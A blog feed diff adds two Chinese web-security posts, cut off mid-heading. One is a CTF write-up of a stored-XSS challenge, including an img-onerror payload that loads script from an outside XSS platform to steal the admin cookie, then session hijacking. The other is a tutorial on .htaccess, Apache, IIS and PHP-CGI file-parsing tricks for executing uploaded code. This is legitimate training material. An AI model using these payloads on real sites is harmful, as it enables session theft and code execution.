@@ -4,6 +4,66 @@
   
     
     <entry>
+      <title>web-buuoj-(BUU XSS COURSE1)</title>
+      <link href="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/"/>
+      <url>/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h2><p>地址：<a href="https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201">https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201</a></p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208114946218.png" style="zoom:50%;"><p>题面:</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115050858.png" style="zoom:80%;"><p>主要有两个功能，“吐槽”和“登录”。</p><h1 id="二、核心思路"><a href="#二、核心思路" class="headerlink" title="二、核心思路"></a>二、核心思路</h1><p>本关既然考察xss，那么核心思路就是：</p><p>1）通过在留言处注入xss攻击代码；</p><p>2）然后等待管理员访问留言，触发xss攻击代码的执行；</p><p>3）盗取管理员的登录凭据，进而登录后台。</p><h1 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h1><h2 id="3-1-漏洞探测"><a href="#3-1-漏洞探测" class="headerlink" title="3.1 漏洞探测"></a>3.1 漏洞探测</h2><ul><li>提交12345数据。</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115539452.png" style="zoom:80%;"><ul><li>访问留言内容</li></ul><p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115737530.png" alt="image-20250208115737530"></p><p>测试几次发现每次保存的链接都会不一样。</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208120601608.png" style="zoom:50%;"><p>留言内容会插入在一个span标签中。</p><ul><li>测试XSS POC</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script " ' Oonn<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208115955748.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208120047378.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208120319154.png" style="zoom:80%;"><p>自动添加了script闭合标签。</p><p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208124618612.png" alt="image-20250208124618612"></p><p>script脚本插入成功了但是没有被执行，没有出现弹窗。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125159738.png" alt="image-20250208125159738"></p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125227297.png" style="zoom:80%;"><p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125401014.png" alt="image-20250208125401014"></p><p>成功触发xss代码的执行。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125439337.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208125652562.png" style="zoom:80%;"><p>使用img标签成功触发xss代码的执行。</p><p>说明目标存在存储型的XSS漏洞。</p><h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h2><h3 id="3-2-1-xss平台"><a href="#3-2-1-xss平台" class="headerlink" title="3.2.1 xss平台"></a>3.2.1 xss平台</h3><ul><li><p><a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a> 【免费会员（暂停服务）！VIP赞助会员（正常使用）。】</p></li><li><p><a href="https://xssaq.com/">https://xssaq.com/</a> 【经过测试，不是很好用。】</p></li><li><p><a href="https://xssjs.com/">https://xssjs.com/</a> 【推荐】</p></li></ul><h3 id="3-2-2-利用过程"><a href="#3-2-2-利用过程" class="headerlink" title="3.2.2 利用过程"></a>3.2.2 利用过程</h3><ul><li>创建项目</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140014466.png" style="zoom:80%;"><ul><li>配置项目</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140113728.png" style="zoom:80%;"><p>一般情况下选择超强默认模块即可。</p><ul><li>查看payload</li></ul><p>点击<code>查看代码</code>，查看payload。</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140214727.png" style="zoom:80%;"><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140332992.png" style="zoom:80%;"><p>根据情况选择适合的payload插入到存在xss漏洞的位置即可。针对本题目，选择了上面高亮的payload：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span>s<span class="token operator">=</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//uj.ci/bok'</span><span class="token punctuation">;</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>插入payload</li></ul><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140508718.png" style="zoom:80%;"><p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208140606132.png" alt="image-20250208140606132"></p><p>可以看到代码被成功插入。</p><ul><li>盗取cookie</li></ul><p>当后台管理员访问我们的留言时，触发xss代码的执行，上线xss平台。</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141019568.png" style="zoom:80%;"><p>可以看到管理员的敏感信息已经被我们获取到了，包括：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cookie <span class="token builtin class-name">:</span> <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>1b0db00bb2d687b7bf520ae8e22e05e4 【管理员的cookie】HTTP_REFERER <span class="token builtin class-name">:</span> http://web/backend/admin.php 【后台页面】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>冒充管理员登录</li></ul><p>当使用当前的PHPSESSID尝试访问管理员页面时：</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141610037.png" style="zoom:50%;"><p>提示没有登录。</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141233180.png" style="zoom:80%;"><p>这是我们目前的PHPSESSID值。</p><p>将PHPSESSID的值修改为<code>1b0db00bb2d687b7bf520ae8e22e05e4</code>，也就是管理员的cookie。</p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141325803.png" style="zoom:80%;"><p>然后访问后台页面：<code>/backend/admin.php</code></p><img src="/2025/02/10/ctf-shi-zhan/web-buuoj-buu-xss-course1/image-20250208141419694.png" style="zoom:80%;"><p>发现能够成功访问回台并获取flag。</p><h2 id="3-3-Flag"><a href="#3-3-Flag" class="headerlink" title="3.3 Flag"></a>3.3 Flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>bdc5ff12-2c30-4bba-8777-8a617f70c93a<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文主要基于buuoj平台的(BUU XSS COURSE1)题目来实践存储型XSS漏洞的挖掘与利用过程。整个过程包括几个核心点：1）漏洞探测、2）通过xss平台构建payload 、3）盗取管理员的凭据、4）冒充管理登录后台。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
+            
+            <tag> 跨站脚本攻击 </tag>
+            
+            <tag> 存储型XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件解析漏洞</title>
+      <link href="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/"/>
+      <url>/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、文件解析漏洞简介"><a href="#一、文件解析漏洞简介" class="headerlink" title="一、文件解析漏洞简介"></a>一、文件解析漏洞简介</h1><p>文件解析漏洞是Web安全领域中的一种常见漏洞，主要发生在应用程序解析文件时，未能正确处理文件内容或格式，从而导致安全问题。这种漏洞可能被攻击者利用，通过上传或处理恶意构造的文件，来执行未授权的操作，例如远程代码执行、信息泄露、拒绝服务攻击等。</p><p>文件解析漏洞可以为文件上传漏洞提供漏洞利用的可能，两者关系紧密，相辅相成。</p><h1 id="二、-htaccess攻击（-htaccess-文件解析）"><a href="#二、-htaccess攻击（-htaccess-文件解析）" class="headerlink" title="二、.htaccess攻击（.htaccess 文件解析）"></a>二、.htaccess攻击（.htaccess 文件解析）</h1><h2 id="2-1-htaccess配置简介"><a href="#2-1-htaccess配置简介" class="headerlink" title="2.1 .htaccess配置简介"></a>2.1 .htaccess配置简介</h2><p> 如果网站允许<code>.htaccess</code>配置覆盖全局配置文件，并且<code>.htaccess</code>文件用户可以上传或编辑修改，那么网站存在巨大的安全漏洞，导致任意文件解析，网站沦陷。</p><p> .htaccess是Apache服务器的分布式配置文件，该配置文件会覆盖Apache服务器的全局配置，作用域是当前目录及其子目录。</p><p> 如果一个Web应用允许上传.htaccess文件，那就意味着攻击者可以更改Apache的配置，这是十分危险的。. htaccess 攻击想象空间非常大。</p><p>首先看Apache的配置，允许.htaccess文件覆盖掉Apache的配置。</p><blockquote><h4 id="EX：Apache-允许-htaccess-文件覆盖掉Apache的配置"><a href="#EX：Apache-允许-htaccess-文件覆盖掉Apache的配置" class="headerlink" title="EX：Apache 允许.htaccess 文件覆盖掉Apache的配置"></a>EX：Apache 允许.htaccess 文件覆盖掉Apache的配置</h4><p>httpd.conf</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%884.44.54.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%884.46.10.png" style="zoom:55%;"><p> AllowOverride All</p></blockquote><p>如何利用.htaccess 攻击：</p><h2 id="2-2-将-png文件当作PHP文件解析"><a href="#2-2-将-png文件当作PHP文件解析" class="headerlink" title="2.2 将.png文件当作PHP文件解析"></a>2.2 将.png文件当作PHP文件解析</h2><p>将以下代码写入文件，并保存成.htaccess名字， 放到测试目录下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在同一目录下创建一个文件[info.png],文件内容如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当我们访问该文件时，[ info.png]内的PHP代码将会被执行。</p><blockquote><h4 id="EX：利用-htaccess文件使得-png文件可以被解析执行"><a href="#EX：利用-htaccess文件使得-png文件可以被解析执行" class="headerlink" title="EX：利用.htaccess文件使得.png文件可以被解析执行"></a>EX：利用.htaccess文件使得.png文件可以被解析执行</h4><p>1、准备.htaccess文件，win系统没法创建。</p><p>mac 创建，并上传到相应目录。mac上创建的话会隐藏起来。可以在BP抓包的时候再修改文件名。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.46.34.png" style="zoom:45%;"><p>mac 如何显示隐藏文件和.点开头文件？</p><p>如果想在Finder中就能直观看到隐藏文件，那么在终端中输入以下下命令：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults <span class="token function">write</span> com.apple.Finder AppleShowAllFiles YES<span class="token function">killall</span> Finder<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>win 用notepad++穿件新文件，保存的时候选择*.*格式即可创建.htaccess文件。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.27.27.png" style="zoom:75%;"><p>2、准备后缀名为.png的php脚本。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.54.55.png" style="zoom:55%;"><p>3、访问解析执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.55.38.png" style="zoom:35%;"><p>注释掉.htaccess中的配置，.png不可解析执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.56.52.png" style="zoom:45%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%888.56.38.png" style="zoom:45%;"></blockquote><p>利用思路： 利用文件上传漏洞上传.htaccess文件，其中配置相关条目使得jpg,png等文件可以被当作php等可执行脚本解析。</p><h2 id="2-3-文件名字中包含-php关键字即可执行"><a href="#2-3-文件名字中包含-php关键字即可执行" class="headerlink" title="2.3 文件名字中包含.php关键字即可执行"></a>2.3 文件名字中包含.php关键字即可执行</h2><p>当文件名[info.php.png]中包含关键字[.php],并且.htaccess文件内容如下，info.php.png中的代码会被执行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">AddHandler php5-script php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="EX：-htaccess-解析任意包含-php-关键字的文件"><a href="#EX：-htaccess-解析任意包含-php-关键字的文件" class="headerlink" title="EX：.htaccess 解析任意包含.php.关键字的文件"></a>EX：.htaccess 解析任意包含.php.关键字的文件</h4><p>.htaccess 文件的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">AddHandler php5-script php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>准备相关测试文件：</p><p>haha.phpinfo.png 【❌，这种文件名不行，前后都有点才行】</p><p>haha.php.info.png 【✅，这种文件名可以，前后都有点才行】</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.15.43.png" style="zoom:35%;"></blockquote><h2 id="2-4-匹配文件名解析"><a href="#2-4-匹配文件名解析" class="headerlink" title="2.4 匹配文件名解析"></a>2.4 匹配文件名解析</h2><p>以下配置是匹配文件名[hack]，找到该文件，并执行其中的PHP代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">"hack"</span><span class="token operator">&gt;</span>SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX：匹配文件名解析执行任意文件"><a href="#EX：匹配文件名解析执行任意文件" class="headerlink" title="EX：匹配文件名解析执行任意文件"></a>EX：匹配文件名解析执行任意文件</h4><p>1、.htaccess 文件的内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>FilesMatch <span class="token string double-quoted-string">"hack"</span><span class="token operator">&gt;</span>SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2、准备测试文件：</p><p>hack【✅可以解析执行】</p><p>sxkhack【✅ 可以解析执行】</p><p>3、结论，只需要文件名中包含关键词就行。</p></blockquote><blockquote><h4 id="EX-upload-labs-pass-4"><a href="#EX-upload-labs-pass-4" class="headerlink" title="EX:upload-labs-pass-4"></a>EX:upload-labs-pass-4</h4><p>1、准备.htaccess文件和待解析的目标文件 sxkhack</p><p>.htaccess </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>FilesMatch <span class="token string">"sxk"</span><span class="token operator">&gt;</span>SetHandler application/x-httpd-php<span class="token operator">&lt;</span>/FilesMatch<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>sxkhack</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、上传两者进行测试</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.40.30.png" style="zoom:35%;"><p>.htaccess 和目标文件均上传成功，目标文件可以解析。</p></blockquote><h1 id="三、Web容器文件解析漏洞"><a href="#三、Web容器文件解析漏洞" class="headerlink" title="三、Web容器文件解析漏洞"></a>三、Web容器文件解析漏洞</h1><h2 id="3-1-Apache解析漏洞"><a href="#3-1-Apache解析漏洞" class="headerlink" title="3.1 Apache解析漏洞"></a>3.1 Apache解析漏洞</h2><p>  Apache从后往前解析文件名，直到碰到它认识的文件名后缀时开始解析，这个过程中黑名单被绕过，目标可执行文件被成功解析执行。</p><p>⚠️：Apache新版版已经修复了从后往前的这样一个文件解析漏洞。常出现在CTF中。</p><blockquote><h4 id="EX：apache文件解析漏洞-upload-labs-pass-4"><a href="#EX：apache文件解析漏洞-upload-labs-pass-4" class="headerlink" title="EX：apache文件解析漏洞 upload-labs-pass-4"></a>EX：apache文件解析漏洞 upload-labs-pass-4</h4><p>1、创建目标文件</p><p>后缀名：<code>.php.xxx.xx.x</code></p><p>内容：<code>&lt;?php phpinfo();?&gt;</code></p><p>2、上传进行漏洞验证</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.50.51.png" style="zoom:45%;"></blockquote><h2 id="3-2-IIS6-0-解析漏洞"><a href="#3-2-IIS6-0-解析漏洞" class="headerlink" title="3.2 IIS6.0 解析漏洞"></a>3.2 IIS6.0 解析漏洞</h2><h3 id="3-2-1-asp-1-jpg"><a href="#3-2-1-asp-1-jpg" class="headerlink" title="3.2.1 .asp;1.jpg"></a>3.2.1 .asp;1.jpg</h3><p>eg: time.asp;1.jpg</p><blockquote><h4 id="EX：IIS6-0文件解析漏洞之一-asp-1-jpg"><a href="#EX：IIS6-0文件解析漏洞之一-asp-1-jpg" class="headerlink" title="EX：IIS6.0文件解析漏洞之一 -.asp;1.jpg"></a>EX：IIS6.0文件解析漏洞之一 -.asp;1.jpg</h4><p>windows 2003 </p><p>   1、创建合法目标文件</p><p> 后缀名：time.asp</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%=time()%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.58.10.png" style="zoom:75%;"><p>正常访问执行。</p><p>2、更改后缀名进行漏洞验证。</p><p>后缀名:time.asp;1.jpg</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.59.28.png" style="zoom:75%;"><p>图像文件被解析执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%889.59.57.png" style="zoom:65%;"><p>3、结论</p><p>   针对IIS6.0的解析漏洞，可以将恶意asp代码伪装成jpg图像等合法文件，绕过检测，服务器仍可以解析执行恶意代码。</p></blockquote><h3 id="3-2-2-1-asp-time-jpg"><a href="#3-2-2-1-asp-time-jpg" class="headerlink" title="3.2.2 1.asp/time.jpg"></a>3.2.2 1.asp/time.jpg</h3><p>以.asp结尾的目录下的文件被解析为asp脚本执行。</p><blockquote><h4 id="EX：IIS6-0文件解析漏洞之二-1-asp-time-jpg"><a href="#EX：IIS6-0文件解析漏洞之二-1-asp-time-jpg" class="headerlink" title="EX：IIS6.0文件解析漏洞之二 -1.asp/time.jpg"></a>EX：IIS6.0文件解析漏洞之二 -1.asp/time.jpg</h4><p>1、创建 1.asp目录，下面的time.asp脚本改名为time.jpg</p><p>time.jpg的内容</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%=time()%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、访问测试</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.13.26.png" style="zoom:55%;"><p>3、结论</p><p>以.asp结尾的目录下面的合法文件会被解析成脚本执行。</p><p>利用？设法创建1.asp这样的文件夹，下面放文件名合法但是内容是恶意代码的文件，恶意代码可以解析执行。</p></blockquote><h2 id="3-3-PHP-CGI解析漏洞"><a href="#3-3-PHP-CGI解析漏洞" class="headerlink" title="3.3 PHP CGI解析漏洞"></a>3.3 PHP CGI解析漏洞</h2><h3 id="3-3-1-原理"><a href="#3-3-1-原理" class="headerlink" title="3.3.1 原理"></a>3.3.1 原理</h3><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.17.00.png" style="zoom:75%;"><p>cgi.fix_pathinfo参数在默认开启的情况下会造成文件解析漏洞。</p><p>[info.png/.php ] png图片中的php代码解析执行。</p><p>平台：IIS7.5/7.0 + PHP 5.4.45/5.2.17 、 ngix + PHP </p><p>⚠️：这个漏洞跟IIS和nginx没关系，和PHP 参数 cgi.fix_pathinfo的设置有关系。</p><h3 id="3-3-2-防御"><a href="#3-3-2-防御" class="headerlink" title="3.3.2 防御"></a>3.3.2 防御</h3><p>F1、找到处理映射程序-请求限制-映射-勾上</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.31.45.png" style="zoom:35%;"><p>F2、将PHP cgi.fix_pathinfo 设置为0</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.34.54.png" style="zoom:75%;"><h3 id="3-3-3-IIS7-0-7-5-PHP环境测试和防御"><a href="#3-3-3-IIS7-0-7-5-PHP环境测试和防御" class="headerlink" title="3.3.3 IIS7.0/7.5 + PHP环境测试和防御"></a>3.3.3 IIS7.0/7.5 + PHP环境测试和防御</h3><p>一般来说php和apache配合。</p><blockquote><h4 id="EX：IIS7-0-7-5-PHP-CGI解析漏洞"><a href="#EX：IIS7-0-7-5-PHP-CGI解析漏洞" class="headerlink" title="EX：IIS7.0/7.5 + PHP CGI解析漏洞"></a>EX：IIS7.0/7.5 + PHP CGI解析漏洞</h4><p>step1:让IIS7.5/7.0支持PHP环境</p><p>1、安装IIS</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.31.05.png" style="zoom:35%;"><p>IIS搭建成功。</p><p>删掉默认网站重新建一个网站。</p><p>2、新建站点。</p><p>test 80端口 指定物理路径 wwwroot</p><p>其实和默认站点配置一样。</p><p>3、IIS7调用PHP环境</p><p>使用phpstudy环境：C:\phpstudy\php\php-5.4.45</p><p> 创建处理映射程序。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.44.32.png" style="zoom:75%;"><p>双击-添加模块映射-</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.47.20.png" style="zoom:55%;"><p>名称随便起。点击确定，是。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.48.18.png" style="zoom:75%;"><p>配置FastCGI监视PHP配置文件</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.49.09.png" style="zoom:35%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.50.29.png" style="zoom:35%;"><p>编辑-选择php.ini.</p><p>4、测试IIS是否支持PHP脚本解析</p><p> C:\inetpub\wwwroot\info.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问：</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8810.57.41.png" style="zoom:55%;"><p>尝试解决：</p><p>请求限制设置成执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.06.34.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.04.25.png" style="zoom:55%;"><p>不行。改回脚本。</p><p>换5.2.17 ✅。可以了</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.24.22.png" style="zoom:25%;"><p>step2:解析漏洞验证</p><p>将php脚本后缀改为 .png</p><p>访问的时候后面+ /.php</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.29.00.png" style="zoom:75%;"><p>php脚本执行。</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.30.06.png" style="zoom:75%;"><p>原因：cgi.fix_pathinfo默认开启。</p><p>step3:防御</p><p>防御：</p><p>找到处理映射程序-请求限制-映射-勾上</p><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.31.45-9179165.png" style="zoom:55%;"><img src="/2025/02/10/web-an-quan/wen-jian-jie-xi-lou-dong/%E6%88%AA%E5%B1%8F2021-07-06%20%E4%B8%8A%E5%8D%8811.32.41.png" style="zoom:35%;"></blockquote><h2 id="3-4-nginx解析漏洞"><a href="#3-4-nginx解析漏洞" class="headerlink" title="3.4 nginx解析漏洞"></a>3.4 nginx解析漏洞</h2><h3 id="3-4-1-CGI解析漏洞"><a href="#3-4-1-CGI解析漏洞" class="headerlink" title="3.4.1 CGI解析漏洞"></a>3.4.1 